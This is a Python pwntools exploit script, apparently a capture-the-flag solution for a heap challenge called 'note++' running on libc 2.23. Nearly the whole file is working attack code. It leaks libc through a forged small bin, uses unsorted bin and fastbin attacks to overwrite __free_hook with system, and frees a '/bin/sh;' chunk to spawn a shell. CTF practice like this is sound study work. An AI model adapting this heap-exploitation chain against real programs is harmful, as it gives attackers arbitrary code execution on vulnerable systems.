#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

def add(size, note, desc, line=True):
    p.sendlineafter('>', str(1))
    p.sendlineafter(':', str(size))
    if line:
        p.sendlineafter(':', note)
        p.sendlineafter(':', desc)
    else:
        p.sendafter(':', note)
        p.sendafter(':', desc)

def showlist():
    p.sendlineafter('>', str(2))

def delete(idx):
    p.sendlineafter('>', str(3))
    p.sendlineafter(':', str(idx))

oneGadget = 0x4526a

# p = remote('edu-ctf.csie.org', 10181)
p = process('./note++-4420ae091f6beb0619b408c6b9410c52')
libc = ELF('./libc-2.23.so')

## Leak Libc
# Fake a small bin
add(0x10, b'a'*0xe, b'desc')
add(0x60, b'b'*0x5e, b'desc')
add(0x60, b'c'*0x5e, b'desc')
add(0x10, b'\x87'*0xe, b'desc')
add(0x60, b'\x88'*0xe, b'desc')
delete(0)
# raw_input('[?] Fake a small bin')
payload = b'A'*0x10
payload += p64(0) + p64(0x91)
payload += b'B'*0x80
payload += p64(0) + p64(0x51)
add(0x0, payload, b'desc')

# Free small bin
# raw_input('[?] Free small bin')
delete(1)

# Leak libc
delete(0)
payload = b'a' * 0xe
# raw_input('[?] Leak Libc')
add(0x0, payload, b'f'*48, line=False)
showlist()
p.recvuntil(b'Note 1:')
p.recvuntil(b'Data: ')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 0x3c4b78
info('libc.address: {}'.format(hex(libc.address)))

## Unsorted bin attack, write 0x7f?????? in front of __free_hook
# Shrink unsorted bin from 0x90 to 0x50
raw_input('shrink> ')
add(0x30, b'd'*0x2e, b'desc')

# Rewrite chunk bk to __free_hook-0x70
delete(0)
payload = b'/bin/sh;'.ljust(0x10, b'A')
payload += p64(0) + p64(0x41)
payload += b'D'*0x30
payload += p64(0) + p64(0x51)
payload += p64(0) + p64(libc.symbols['__free_hook']-0x70)
raw_input('rewrite>')
add(0x0, payload, b'desc')

# Get the chunk, and write (main_arena->bins - 0x10) to (__free_hook - 0x70)->fd
raw_input('getchunk>')
add(0x40, b'B'*0x3e, b'desc')

## Fast bin attack, forge a fake chunk in front of __free_hook
delete(4)
delete(3)
payload = b'\x66'*0x10
payload += p64(0) + p64(0x71)
payload += p64(libc.symbols['__free_hook']-0x63)
raw_input('fastbin attack prepare>')
add(0x0, payload, b'desc')

# Take one useless fastbin
raw_input('take one useless fastbin>')
add(0x60, b'G'*0x5e, b'desc') # Garbage

# Write to __free_hook-0x53
raw_input('write __free_hook>')
payload = b'\x00'*0x53 + p64(libc.symbols['system'])
add(0x60, payload, b'desc')

# call free('/bin/sh')
raw_input('free(\'/bin/sh;\')>')
delete(0)

p.interactive()
